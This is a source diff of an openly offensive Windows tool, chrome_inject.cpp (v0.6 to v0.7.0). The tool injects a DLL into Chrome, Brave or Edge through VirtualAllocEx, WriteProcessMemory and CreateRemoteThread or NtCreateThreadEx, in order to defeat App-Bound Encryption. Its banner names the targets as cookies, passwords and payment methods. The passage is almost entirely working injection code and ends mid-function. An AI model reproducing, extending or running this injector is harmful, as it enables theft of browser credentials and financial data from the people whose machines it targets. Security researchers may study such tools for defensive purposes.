@@ -1,79 +1,149 @@
 // chrome_inject.cpp
-// v0.6 (c) Alexander 'xaitax' Hagenah
+// v0.7.0 (c) Alexander 'xaitax' Hagenah
+// Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
 #include <tlhelp32.h>
+#include <VersionHelpers.h>
 #include <fstream>
 #include <iostream>
 #include <string>
+#include <string_view>
 #include <vector>
+#include <sstream>
 #include <iomanip>
 #include <filesystem>
+#include <cctype>
+#include <cwctype>
+#include <algorithm>
+#include <optional>
+#include <map>
 
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "version.lib")
+
+const WCHAR *COMPLETION_EVENT_NAME_INJECTOR = L"Global\\ChromeDecryptWorkDoneEvent";
+constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
+constexpr DWORD BROWSER_INIT_WAIT_MS = 3000;
+constexpr DWORD INJECTOR_REMOTE_THREAD_WAIT_MS = 15000;
 
 typedef LONG NTSTATUS;
 #ifndef NT_SUCCESS
 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
 #endif
 
-std::string WStringToUtf8(const std::wstring &w)
-{
-    int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
-    std::string s(sz, '\0');
-    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, nullptr, nullptr);
-    if (!s.empty() && s.back() == '\0')
-        s.pop_back();
-    return s;
-}
-
 static bool verbose = false;
+
+std::string WStringToUtf8(std::wstring_view w_sv)
+{
+    if (w_sv.empty())
+        return std::string();
+
+    int size_needed = WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), nullptr, 0, nullptr, nullptr);
+    if (size_needed == 0)
+    {
+        return "";
+    }
+
+    std::string utf8_str(size_needed, '\0');
+    WideCharToMultiByte(CP_UTF8, 0, w_sv.data(), static_cast<int>(w_sv.length()), &utf8_str[0], size_needed, nullptr, nullptr);
+    return utf8_str;
+}
 
 inline void debug(const std::string &msg)
 {
     if (!verbose)
         return;
-    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 14);
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN);
     std::cout << "[#] " << msg << std::endl;
-    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
 }
 
 struct HandleGuard
 {
     HANDLE h_;
-    explicit HandleGuard(HANDLE h = nullptr) : h_(h) { debug("HandleGuard: acquired handle " + std::to_string((uintptr_t)h)); }
+    explicit HandleGuard(HANDLE h = nullptr) : h_((h == INVALID_HANDLE_VALUE) ? nullptr : h)
+    {
+        if (h_)
+        {
+            debug("HandleGuard: acquired handle " + std::to_string(reinterpret_cast<uintptr_t>(h_)));
+        }
+        else if (h == INVALID_HANDLE_VALUE)
+        {
+            debug("HandleGuard: acquired INVALID_HANDLE_VALUE, stored as null.");
+        }
+    }
     ~HandleGuard()
     {
-        if (h_ && h_ != INVALID_HANDLE_VALUE)
+        if (h_)
         {
-            debug("HandleGuard: closing handle " + std::to_string((uintptr_t)h_));
+            debug("HandleGuard: closing handle " + std::to_string(reinterpret_cast<uintptr_t>(h_)));
             CloseHandle(h_);
         }
     }
     HANDLE get() const { return h_; }
     void reset(HANDLE h = nullptr)
     {
-        if (h_ && h_ != INVALID_HANDLE_VALUE)
+        if (h_)
             CloseHandle(h_);
-        h_ = h;
-        debug("HandleGuard: reset handle to " + std::to_string((uintptr_t)h_));
+        h_ = (h == INVALID_HANDLE_VALUE) ? nullptr : h;
+        if (h_)
+        {
+            debug("HandleGuard: reset handle to " + std::to_string(reinterpret_cast<uintptr_t>(h_)));
+        }
+        else
+        {
+            debug("HandleGuard: reset handle to null.");
+        }
+    }
+    explicit operator bool() const { return h_ != nullptr; }
+
+    HandleGuard(const HandleGuard &) = delete;
+    HandleGuard &operator=(const HandleGuard &) = delete;
+    HandleGuard(HandleGuard &&other) noexcept : h_(other.h_) { other.h_ = nullptr; }
+    HandleGuard &operator=(HandleGuard &&other) noexcept
+    {
+        if (this != &other)
+        {
+            if (h_)
+                CloseHandle(h_);
+            h_ = other.h_;
+            other.h_ = nullptr;
+        }
+        return *this;
     }
 };
 
 void print_status(const std::string &tag, const std::string &msg)
 {
-    WORD col = 7;
+    WORD original_attributes = 0;
+    CONSOLE_SCREEN_BUFFER_INFO console_info;
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    if (GetConsoleScreenBufferInfo(hConsole, &console_info))
+    {
+        original_attributes = console_info.wAttributes;
+    }
+    else
+    {
+        original_attributes = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
+    }
+
+    WORD col = original_attributes;
     if (tag == "[+]")
-        col = 10;
+        col = FOREGROUND_GREEN | FOREGROUND_INTENSITY;
     else if (tag == "[-]")
-        col = 12;
+        col = FOREGROUND_RED | FOREGROUND_INTENSITY;
     else if (tag == "[*]")
-        col = 9;
-    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), col);
+        col = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+    else if (tag == "[WT]")
+        col = FOREGROUND_BLUE | FOREGROUND_INTENSITY;
+    else if (tag == "[!]")
+        col = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY;
+
+    SetConsoleTextAttribute(hConsole, col);
     std::cout << tag;
-    SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
+    SetConsoleTextAttribute(hConsole, original_attributes);
     std::cout << " " << msg << std::endl;
 }
 
@@ -94,39 +164,58 @@ static const char *ArchName(USHORT m)
 
 constexpr USHORT MyArch =
 #if defined(_M_IX86)
-    IMAGE_FILE_MACHINE_I386;
+    IMAGE_FILE_MACHINE_I386
 #elif defined(_M_X64)
-    IMAGE_FILE_MACHINE_AMD64;
+    IMAGE_FILE_MACHINE_AMD64
 #elif defined(_M_ARM64)
-    IMAGE_FILE_MACHINE_ARM64;
+    IMAGE_FILE_MACHINE_ARM64
 #else
-    IMAGE_FILE_MACHINE_UNKNOWN;
+    IMAGE_FILE_MACHINE_UNKNOWN
 #endif
+    ;
 
 bool GetProcessArchitecture(HANDLE hProc, USHORT &arch)
 {
-    auto fn = (decltype(&IsWow64Process2))
+    auto fnIsWow64Process2 = (decltype(&IsWow64Process2))
         GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
-    if (fn)
+    if (fnIsWow64Process2)
     {
-        USHORT proc, native;
-        if (!fn(hProc, &proc, &native))
+        USHORT processMachine = IMAGE_FILE_MACHINE_UNKNOWN;
+        USHORT nativeMachine = IMAGE_FILE_MACHINE_UNKNOWN;
+        if (!fnIsWow64Process2(hProc, &processMachine, &nativeMachine))
+        {
+            DWORD lastError = GetLastError();
+            debug("IsWow64Process2 call failed. Error: " + std::to_string(lastError));
             return false;
-        arch = (proc == IMAGE_FILE_MACHINE_UNKNOWN) ? native : proc;
+        }
+        arch = (processMachine == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processMachine;
+        debug(std::string("IsWow64Process2: processMachine=") + ArchName(processMachine) + ", nativeMachine=" + ArchName(nativeMachine) + ", effectiveArch=" + ArchName(arch));
         return true;
     }
-    BOOL wow = FALSE;
-    if (!IsWow64Process(hProc, &wow))
+
+    BOOL isWow64 = FALSE;
+    if (!IsWow64Process(hProc, &isWow64))
+    {
+        DWORD lastError = GetLastError();
+        debug("IsWow64Process call failed. Error: " + std::to_string(lastError));
         return false;
+    }
+
 #if defined(_M_X64)
-    arch = wow ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64;
+    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64;
 #elif defined(_M_ARM64)
-    arch = wow ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_ARM64;
+    arch = isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_ARM64;
 #elif defined(_M_IX86)
     arch = IMAGE_FILE_MACHINE_I386;
+    if (isWow64)
+    {
+        debug("Warning: 32-bit injector and IsWow64Process returned TRUE for target. This is unusual.");
+    }
 #else
     arch = IMAGE_FILE_MACHINE_UNKNOWN;
+    return false;
 #endif
+    debug(std::string("IsWow64Process: isWow64=") + (isWow64 ? "TRUE" : "FALSE") + ", effectiveArch=" + ArchName(arch));
     return true;
 }
 
@@ -146,6 +235,7 @@ bool CheckArchMatch(HANDLE hProc)
                          " but target is " + ArchName(targetArch));
         return false;
     }
+    debug("Architecture match: Injector=" + std::string(ArchName(MyArch)) + ", Target=" + std::string(ArchName(targetArch)));
     return true;
 }
 
@@ -156,7 +246,7 @@ void DisplayBanner()
     std::cout << "|  Chrome App-Bound Encryption Decryption      |" << std::endl;
     std::cout << "|  Multi-Method Process Injector               |" << std::endl;
     std::cout << "|  Cookies / Passwords / Payment Methods       |" << std::endl;
-    std::cout << "|  v0.6 by @xaitax                             |" << std::endl;
+    std::cout << "|  v0.7.0 by @xaitax                           |" << std::endl;
     std::cout << "------------------------------------------------" << std::endl
               << std::endl;
     SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
@@ -164,157 +254,296 @@ void DisplayBanner()
 
 void CleanupPreviousRun()
 {
-    debug("CleanupPreviousRun: removing temp files");
+    debug("CleanupPreviousRun: attempting to remove temp files");
     char tmp[MAX_PATH];
-    if (GetTempPathA(MAX_PATH, tmp))
+    DWORD pathLen = GetTempPathA(MAX_PATH, tmp);
+    if (pathLen > 0 && pathLen < MAX_PATH)
     {
-        std::string logf = std::string(tmp) + "chrome_decrypt.log";
-        std::string keyf = std::string(tmp) + "chrome_appbound_key.txt";
-        debug("Deleting " + logf);
-        DeleteFileA(logf.c_str());
-        debug("Deleting " + keyf);
-        DeleteFileA(keyf.c_str());
+        std::filesystem::path tempDir(tmp);
+        std::filesystem::path logf = tempDir / "chrome_decrypt.log";
+        std::filesystem::path keyf = tempDir / "chrome_appbound_key.txt";
+
+        std::error_code ec;
+        if (std::filesystem::exists(logf))
+        {
+            debug("Deleting " + logf.string());
+            if (!std::filesystem::remove(logf, ec))
+            {
+                debug("Failed to delete log file: " + logf.string() + ". Error: " + ec.message());
+            }
+        }
+        else
+        {
+            debug("Log file not found, no cleanup needed: " + logf.string());
+        }
+
+        if (std::filesystem::exists(keyf))
+        {
+            debug("Deleting " + keyf.string());
+            if (!std::filesystem::remove(keyf, ec))
+            {
+                debug("Failed to delete key file: " + keyf.string() + ". Error: " + ec.message());
+            }
+        }
+        else
+        {
+            debug("Key file not found, no cleanup needed: " + keyf.string());
+        }
+    }
+    else
+    {
+        DWORD lastError = GetLastError();
+        debug("CleanupPreviousRun: GetTempPathA failed. Error: " + std::to_string(lastError));
     }
 }
 
-DWORD GetProcessIdByName(const std::wstring &procName)
+std::optional<DWORD> GetProcessIdByName(const std::wstring &procName)
 {
-    debug("GetProcessIdByName: snapshotting processes");
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE)
+    debug("GetProcessIdByName: snapshotting processes for " + WStringToUtf8(procName));
+    HandleGuard snap(CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0));
+    if (!snap)
     {
-        debug("GetProcessIdByName: snapshot failed");
-        return 0;
+        DWORD lastError = GetLastError();
+        debug("GetProcessIdByName: CreateToolhelp32Snapshot failed. Error: " + std::to_string(lastError));
+        return std::nullopt;
     }
     PROCESSENTRY32W entry{};
     entry.dwSize = sizeof(entry);
-    DWORD pid = 0;
-    if (Process32FirstW(snap, &entry))
+    if (Process32FirstW(snap.get(), &entry))
     {
         do
         {
             if (procName == entry.szExeFile)
             {
-                pid = entry.th32ProcessID;
-                debug("Found process " + WStringToUtf8(procName) + " PID=" + std::to_string(pid));
-                break;
+                debug("Found process " + WStringToUtf8(procName) + " PID=" + std::to_string(entry.th32ProcessID));
+                return entry.th32ProcessID;
             }
-        } while (Process32NextW(snap, &entry));
+        } while (Process32NextW(snap.get(), &entry));
     }
-    CloseHandle(snap);
-    return pid;
+    else
+    {
+        DWORD lastError = GetLastError();
+        if (lastError != ERROR_NO_MORE_FILES)
+        {
+            debug("GetProcessIdByName: Process32FirstW failed. Error: " + std::to_string(lastError));
+        }
+        else
+        {
+            debug("GetProcessIdByName: No processes found by Process32FirstW or list exhausted.");
+        }
+    }
+    debug("GetProcessIdByName: Process " + WStringToUtf8(procName) + " not found.");
+    return std::nullopt;
 }
 
 std::string GetDllPath()
 {
     namespace fs = std::filesystem;
-    auto path = fs::current_path() / "chrome_decrypt.dll";
-    debug("GetDllPath: " + path.string());
-    return path.string();
+    wchar_t currentExePathRaw[MAX_PATH];
+    DWORD len = GetModuleFileNameW(NULL, currentExePathRaw, MAX_PATH);
+    if (len == 0 || (len == MAX_PATH && GetLastError() == ERROR_INSUFFICIENT_BUFFER))
+    {
+        DWORD lastError = GetLastError();
+        debug("GetDllPath: GetModuleFileNameW failed or buffer too small. Error: " + std::to_string(lastError));
+        return "";
+    }
+    fs::path dllPathFs = fs::path(currentExePathRaw).parent_path() / L"chrome_decrypt.dll";
+    std::string dllPathStr = dllPathFs.string();
+    debug("GetDllPath: DLL path determined as: " + dllPathStr);
+    return dllPathStr;
 }
 
 bool InjectWithLoadLibrary(HANDLE proc, const std::string &dllPath)
 {
-    debug("InjectWithLoadLibrary: begin");
-    SIZE_T size = dllPath.size() + 1;
+    debug("InjectWithLoadLibrary: begin for DLL: " + dllPath);
+    SIZE_T size = dllPath.length() + 1;
     debug("VirtualAllocEx size=" + std::to_string(size));
     LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!rem)
     {
-        debug("VirtualAllocEx failed");
+        DWORD lastError = GetLastError();
+        debug("VirtualAllocEx failed. Error: " + std::to_string(lastError));
         return false;
     }
-    debug("WriteProcessMemory of DLL path");
+    debug("WriteProcessMemory of DLL path to remote address: " + std::to_string(reinterpret_cast<uintptr_t>(rem)));
     if (!WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr))
     {
-        debug("WriteProcessMemory failed");
+        DWORD lastError = GetLastError();
+        debug("WriteProcessMemory failed. Error: " + std::to_string(lastError));
         VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
         return false;
     }
-    auto loader = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
-    debug(std::string("LoadLibraryA at ") + std::to_string((uintptr_t)loader));
-    if (!loader)
+    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
+    if (!loadLibraryAddr)
     {
-        debug("GetProcAddress failed");
+        DWORD lastError = GetLastError();
+        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(lastError));
         VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
         return false;
     }
-    debug("Calling CreateRemoteThread");
-    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, loader, rem, 0, nullptr));
-    if (!th.get())
+    debug("Calling CreateRemoteThread with LoadLibraryA at " + std::to_string(reinterpret_cast<uintptr_t>(loadLibraryAddr)));
+    HandleGuard th(CreateRemoteThread(proc, nullptr, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddr, rem, 0, nullptr));
+    if (!th)
     {
-        DWORD e = GetLastError();
-        debug("CreateRemoteThread failed: " + std::to_string(e));
+        DWORD lastError = GetLastError();
+        debug("CreateRemoteThread failed. Error: " + std::to_string(lastError));
         VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
         return false;
     }
-    WaitForSingleObject(th.get(), INFINITE);
-    debug("Remote thread finished");
+    debug("Waiting for remote LoadLibraryA thread to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
+    DWORD wait_res = WaitForSingleObject(th.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
+    if (wait_res == WAIT_TIMEOUT)
+    {
+        debug("Remote LoadLibraryA thread timed out.");
+    }
+    else if (wait_res == WAIT_OBJECT_0)
+    {
+        debug("Remote LoadLibraryA thread finished.");
+    }
+    else
+    {
+        DWORD lastError = GetLastError();
+        debug("WaitForSingleObject on LoadLibraryA thread failed. Error: " + std::to_string(lastError));
+    }
+
     VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
     debug("InjectWithLoadLibrary: done");
-    return true;
+    return (wait_res == WAIT_OBJECT_0);
 }
 
-using pNtCreateThreadEx = NTSTATUS(NTAPI *)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, BOOLEAN, ULONG, SIZE_T, SIZE_T, PVOID);
+using pNtCreateThreadEx = NTSTATUS(NTAPI *)(
+    OUT PHANDLE ThreadHandle,
+    IN ACCESS_MASK DesiredAccess,
+    IN PVOID ObjectAttributes,
+    IN HANDLE ProcessHandle,
+    IN PVOID StartRoutine,
+    IN PVOID Argument,
+    IN ULONG CreateFlags,
+    IN SIZE_T ZeroBits,
+    IN SIZE_T StackSize,
+    IN SIZE_T MaximumStackSize,
+    IN PVOID AttributeList);
+
 bool InjectWithNtCreateThreadEx(HANDLE proc, const std::string &dllPath)
 {
-    debug("InjectWithNtCreateThreadEx: begin");
+    debug("InjectWithNtCreateThreadEx: begin for DLL: " + dllPath);
     HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    debug(std::string("ntdll.dll base=") + std::to_string((uintptr_t)ntdll));
-    auto fn = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
-    debug(std::string("NtCreateThreadEx addr=") + std::to_string((uintptr_t)fn));
-    if (!fn)
+    if (!ntdll)
     {
-        debug("GetProcAddress NtCreateThreadEx failed");
+        DWORD lastError = GetLastError();
+        debug("GetModuleHandleW for ntdll.dll failed. Error: " + std::to_string(lastError));
         return false;
     }
-    SIZE_T size = dllPath.size() + 1;
+    debug(std::string("ntdll.dll base=") + std::to_string(reinterpret_cast<uintptr_t>(ntdll)));
+    auto fnNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
+    if (!fnNtCreateThreadEx)
+    {
+        DWORD lastError = GetLastError();
+        debug("GetProcAddress NtCreateThreadEx failed. Error: " + std::to_string(lastError));
+        return false;
+    }
+    debug(std::string("NtCreateThreadEx addr=") + std::to_string(reinterpret_cast<uintptr_t>(fnNtCreateThreadEx)));
+
+    SIZE_T size = dllPath.length() + 1;
     debug("VirtualAllocEx size=" + std::to_string(size));
     LPVOID rem = VirtualAllocEx(proc, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!rem)
     {
-        debug("VirtualAllocEx failed");
+        DWORD lastError = GetLastError();
+        debug("VirtualAllocEx failed. Error: " + std::to_string(lastError));
         return false;
     }
-    WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr);
-    debug("WriteProcessMemory complete");
-    debug("Calling NtCreateThreadEx");
-    HANDLE thr = nullptr;
-    NTSTATUS st = fn(&thr, THREAD_ALL_ACCESS, nullptr, proc,
-                     GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA"), rem,
-                     FALSE, 0, 0, 0, nullptr);
-    debug(std::string("NtCreateThreadEx returned ") + std::to_string(st) + std::string(", thr=") + std::to_string((uintptr_t)thr));
-    if (!NT_SUCCESS(st) || !thr)
+    if (!WriteProcessMemory(proc, rem, dllPath.c_str(), size, nullptr))
     {
-        debug("NtCreateThreadEx failed");
-        if (thr)
-            CloseHandle(thr);
+        DWORD lastError = GetLastError();
+        debug("WriteProcessMemory failed. Error: " + std::to_string(lastError));
         VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
         return false;
     }
-    WaitForSingleObject(thr, INFINITE);
-    CloseHandle(thr);
+    debug("WriteProcessMemory complete for DLL path to remote address: " + std::to_string(reinterpret_cast<uintptr_t>(rem)));
+
+    LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");
+    if (!loadLibraryAddr)
+    {
+        DWORD lastError = GetLastError();
+        debug("GetProcAddress for LoadLibraryA failed. Error: " + std::to_string(lastError));
+        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
+        return false;
+    }
+    debug("Calling NtCreateThreadEx with LoadLibraryA at " + std::to_string(reinterpret_cast<uintptr_t>(loadLibraryAddr)));
+
+    HANDLE thr = nullptr;
+    NTSTATUS st = fnNtCreateThreadEx(&thr, THREAD_ALL_ACCESS, nullptr, proc,
+                                     loadLibraryAddr, rem,
+                                     0, 0, 0, 0, nullptr);
+
+    HandleGuard remoteThreadHandle(thr);
+
+    debug(std::string("NtCreateThreadEx returned status ") + std::to_string(st) + std::string(", thread handle=") + std::to_string(reinterpret_cast<uintptr_t>(remoteThreadHandle.get())));
+    if (!NT_SUCCESS(st) || !remoteThreadHandle)
+    {
+        std::ostringstream oss;
+        oss << "NtCreateThreadEx failed or returned null thread handle. NTSTATUS: 0x" << std::hex << st;
+        debug(oss.str());
+        VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
+        return false;
+    }
+    debug("Waiting for remote LoadLibraryA thread (NtCreateThreadEx) to complete (max " + std::to_string(INJECTOR_REMOTE_THREAD_WAIT_MS / 1000) + "s)...");
+    DWORD wait_res = WaitForSingleObject(remoteThreadHandle.get(), INJECTOR_REMOTE_THREAD_WAIT_MS);
+    if (wait_res == WAIT_TIMEOUT)
+    {
+        debug("Remote LoadLibraryA thread (NtCreateThreadEx) timed out.");
+    }
+    else if (wait_res == WAIT_OBJECT_0)
+    {
+        debug("Remote LoadLibraryA thread (NtCreateThreadEx) finished.");
+    }
+    else
+    {
+        DWORD lastError = GetLastError();
+        debug("WaitForSingleObject on LoadLibraryA thread (NtCreateThreadEx) failed. Error: " + std::to_string(lastError));
+    }
+
     VirtualFreeEx(proc, rem, 0, MEM_RELEASE);
     debug("InjectWithNtCreateThreadEx: done");
-    return true;
+    return (wait_res == WAIT_OBJECT_0);
 }
 
-bool StartBrowserAndWait(const std::wstring &exe, DWORD &outPid)
+struct BrowserDetails
 {
-    std::string cmd = WStringToUtf8(exe);
-    debug("StartBrowserAndWait: exe=" + cmd);
+    std::wstring processName;
+    std::wstring defaultExePath;
+};
+
+const std::map<std::wstring, BrowserDetails> browserConfigMap = {
+    {L"chrome", {L"chrome.exe", L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"}},
+    {L"brave", {L"brave.exe", L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"}},
+    {L"edge", {L"msedge.exe", L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"}}};
+
+bool StartBrowserAndWait(const std::wstring &exePath, DWORD &outPid)
+{
+    std::string cmd = WStringToUtf8(exePath);
+    debug("StartBrowserAndWait: attempting to launch: " + cmd);
     STARTUPINFOW si{};
     PROCESS_INFORMATION pi{};
     si.cb = sizeof(si);
-    if (!CreateProcessW(exe.c_str(), nullptr, nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
+
+    if (!CreateProcessW(exePath.c_str(), nullptr, nullptr, nullptr, FALSE, 0, nullptr, nullptr, &si, &pi))
     {
-        debug("CreateProcessW failed");
+        DWORD lastError = GetLastError();
+        debug("CreateProcessW failed for " + cmd + ". Error: " + std::to_string(lastError));
         return false;
     }
-    CloseHandle(pi.hThread);
-    Sleep(2000);
+    HandleGuard processHandle(pi.hProcess);
+    HandleGuard threadHandle(pi.hThread);
+
+    debug("Browser main thread handle: " + std::to_string(reinterpret_cast<uintptr_t>(pi.hThread)));
+    debug("Browser process handle: " + std::to_string(reinterpret_cast<uintptr_t>(pi.hProcess)));
+
+    debug("Waiting " + std::to_string(BROWSER_INIT_WAIT_MS / 1000) + "s for browser to initialize...");
+    Sleep(BROWSER_INIT_WAIT_MS);
+
     outPid = pi.dwProcessId;
-    CloseHandle(pi.hProcess);
     debug("Browser started PID=" + std::to_string(outPid));
     return true;
 }
@@ -322,181 +551,306 @@ bool StartBrowserAndWait(const std::wstring &exe, DWORD &outPid)
 int wmain(int argc, wchar_t *argv[])
 {
     DisplayBanner();
-    std::string method = "load";
-    bool autostart = false, started = false;
-    std::wstring browser;
+    std::string injectionMethodStr = "load";
+    bool autoStartBrowser = false;
+    bool browserSuccessfullyStartedByInjector = false;
+    std::wstring browserTypeArg;
+
     debug("wmain: parsing arguments");
     for (int i = 1; i < argc; ++i)
     {
-        std::wstring a = argv[i];
-        debug(std::string("arg[") + std::to_string(i) + "]=" + WStringToUtf8(a));
-        if (a == L"--method" && i + 1 < argc)
+        std::wstring_view arg = argv[i];
+        if ((arg == L"--method" || arg == L"-m") && i + 1 < argc)
         {
-            method = WStringToUtf8(argv[++i]);
-            debug("method=" + method);
+            std::wstring_view method_val_sv = argv[++i];
+            injectionMethodStr = WStringToUtf8(method_val_sv);
+            std::transform(injectionMethodStr.begin(), injectionMethodStr.end(), injectionMethodStr.begin(),
+                           [](unsigned char c_char)
+                           { return static_cast<char>(std::tolower(c_char)); });
+            debug("Injection method set to: " + injectionMethodStr);
         }
-        else if (a == L"--start-browser")
+        else if (arg == L"--start-browser" || arg == L"-s")
         {
-            autostart = true;
-            debug("autostart=true");
+            autoStartBrowser = true;
+            debug("Auto-start browser enabled.");
         }
-        else if (a == L"--verbose")
+        else if (arg == L"--verbose" || arg == L"-v")
         {
             verbose = true;
-            debug("verbose=true");
+            std::cout << "[#] Verbose mode enabled." << std::endl;
         }
-        else if (browser.empty())
+        else if (browserTypeArg.empty() && !arg.empty() && arg[0] != L'-')
         {
-            browser = a;
-            debug("browser=" + WStringToUtf8(browser));
+            browserTypeArg = arg;
+            std::transform(browserTypeArg.begin(), browserTypeArg.end(), browserTypeArg.begin(),
+                           [](wchar_t wc)
+                           { return static_cast<wchar_t>(std::towlower(wc)); });
+            debug("Browser type argument: " + WStringToUtf8(browserTypeArg));
+        }
+        else
+        {
+            print_status("[!]", "Unknown or misplaced argument: " + WStringToUtf8(arg));
         }
     }
-    if (browser.empty())
+
+    if (browserTypeArg.empty())
     {
         SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 12);
         std::wcout << L"Usage:\n"
                    << L"  chrome_inject.exe [options] <chrome|brave|edge>\n\n"
                    << L"Options:\n"
-                   << L"  --method load|nt    Injection method\n"
-                   << L"  --start-browser     Auto-launch browser\n"
-                   << L"  --verbose           Enable verbose debug output\n";
+                   << L"  --method|-m load|nt    Injection method (default: load)\n"
+                   << L"  --start-browser|-s     Auto-launch browser if not running\n"
+                   << L"  --verbose|-v           Enable verbose debug output\n";
         SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
         return 1;
     }
+
     CleanupPreviousRun();
-    std::string disp = WStringToUtf8(browser);
-    if (!disp.empty())
-        disp[0] = toupper((unsigned char)disp[0]);
-    debug("Target display name=" + disp);
-    std::wstring procName, exePath;
-    if (browser == L"chrome")
+
+    HandleGuard completionEvent(CreateEventW(NULL, TRUE, FALSE, COMPLETION_EVENT_NAME_INJECTOR));
+    if (!completionEvent)
     {
-        procName = L"chrome.exe";
-        exePath = L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
-    }
-    else if (browser == L"brave")
-    {
-        procName = L"brave.exe";
-        exePath = L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
-    }
-    else if (browser == L"edge")
-    {
-        procName = L"msedge.exe";
-        exePath = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe";
-    }
-    else
-    {
-        print_status("[-]", "Unsupported browser type");
+        DWORD lastError = GetLastError();
+        print_status("[-]", "Failed to create completion event. Error: " + std::to_string(lastError));
         return 1;
     }
-    debug("procName=" + WStringToUtf8(procName) + ", exePath=" + WStringToUtf8(exePath));
-    DWORD pid = GetProcessIdByName(procName);
-    if (!pid && autostart)
+    debug("Created completion event: " + WStringToUtf8(COMPLETION_EVENT_NAME_INJECTOR));
+    ResetEvent(completionEvent.get());
+
+    auto browserIt = browserConfigMap.find(browserTypeArg);
+    if (browserIt == browserConfigMap.end())
     {
-        print_status("[*]", disp + " not running, launching...");
-        if (StartBrowserAndWait(exePath, pid))
+        print_status("[-]", "Unsupported browser type: " + WStringToUtf8(browserTypeArg));
+        return 1;
+    }
+    const BrowserDetails &currentBrowserInfo = browserIt->second;
+    std::string browserDisplayName = WStringToUtf8(browserTypeArg);
+    if (!browserDisplayName.empty())
+        browserDisplayName[0] = static_cast<char>(std::toupper(static_cast<unsigned char>(browserDisplayName[0])));
+
+    debug("Target: " + browserDisplayName + ", Process: " + WStringToUtf8(currentBrowserInfo.processName) + ", Default Exe: " + WStringToUtf8(currentBrowserInfo.defaultExePath));
+
+    DWORD targetPid = 0;
+    if (auto optPid = GetProcessIdByName(currentBrowserInfo.processName))
+    {
+        targetPid = *optPid;
+    }
+
+    if (targetPid == 0 && autoStartBrowser)
+    {
+        print_status("[*]", browserDisplayName + " not running, launching...");
+        if (StartBrowserAndWait(currentBrowserInfo.defaultExePath, targetPid))
         {
-            started = true;
-            debug("Retrieving version info");
-            DWORD hv = 0, vs = GetFileVersionInfoSizeW(exePath.c_str(), &hv);
-            debug("GetFileVersionInfoSizeW returned size=" + std::to_string(vs));
-            std::string ver;
-            if (vs)
